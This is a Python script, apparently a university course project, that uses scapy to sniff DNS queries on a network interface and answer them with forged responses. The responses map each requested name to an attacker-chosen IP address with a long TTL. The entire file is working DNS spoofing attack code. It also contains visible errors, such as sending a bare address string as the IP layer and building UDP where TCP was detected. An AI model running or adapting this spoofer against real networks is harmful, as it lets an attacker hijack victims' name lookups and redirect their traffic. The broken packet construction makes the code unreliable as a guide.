#Tyler Johnson and Michael Mulzer
#Project 05 code
#CSCI 421 - Paul Talaga
from sys import argv, exit
from scapy.all import *

def main():

    if len(argv) != 3:
        print (' Please enter 3 arguments. (execute, interface, IP address)')

    while 1:
        print('Waiting for DNS request')
        getPacket = sniff(iface=argv[1], filter="dst port 53", count=1)

        if (getPacket[0].haslayer(DNS)) and (getPacket[0].getlayer(DNS).qd.qtype == 1) and (getPacket[0].getlayer(DNS).qr == 0) and (getPacket[0].getlayer(DNS).qd.qclass == 1):

            Address = getPacket[0].getlayer(DNS).qd.qname

            clientSourceIP = getPacket[0].getlayer(IP).src

            QueryID = getPacket[0].getlayer(DNS).id

            QueryDataC = getPacket[0].getlayer(DNS).qdcount

            DNSServer = getPacket[0].getlayer(IP).dst

            if getPacket[0].haslayer(UDP):
                srcPort = getPacket[0].getlayer(UDP).sport
            elif getPacket[0].haslayer(TCP):
                srcPort = getPacket[0].getlayer(TCP).sport

            spoofedIPAdd = argv[2]

            spoofedIPPacket = IP(src=spoofedIPAdd, dst=clientSourceIP)

            if getPacket[0].haslayer(UDP):
                spoofedPortPacket = UDP(sport=53, dport=srcPort)
            elif getPacket[0].haslayer(TCP):
                spoofedPortPacket = UDP(sport=53, dport=srcPort)

            spoofedDNSPacket = DNS(id=QueryID, qr=1, opcode=getPacket[0].getlayer(DNS).opcode, aa=1, rd=0, ra=0, z=0, rcode=0, qdcount=QueryDataC, ancount=1, nscount=1, arcount=1,
                                   qd=DNSQR(qname=Address, qtype=getPacket[0].getlayer(DNS).qd.qtype, qclass=getPacket[0].getlayer(DNS).qd.qclass),
                                   an=DNSRR(rrname=Address, rdata=argv[2].strip(), ttl=86400),
                                   ns=DNSRR(rrname=Address, type=2, ttl=86400, rdata=argv[2]),
                                   ar=DNSRR(rrname=Address, rdata=argv[2]))

            sendp(Ether()/spoofedIPAdd/spoofedPortPacket/spoofedDNSPacket,iface=argv[1].strip(), count=1)

        else:
            pass

main()
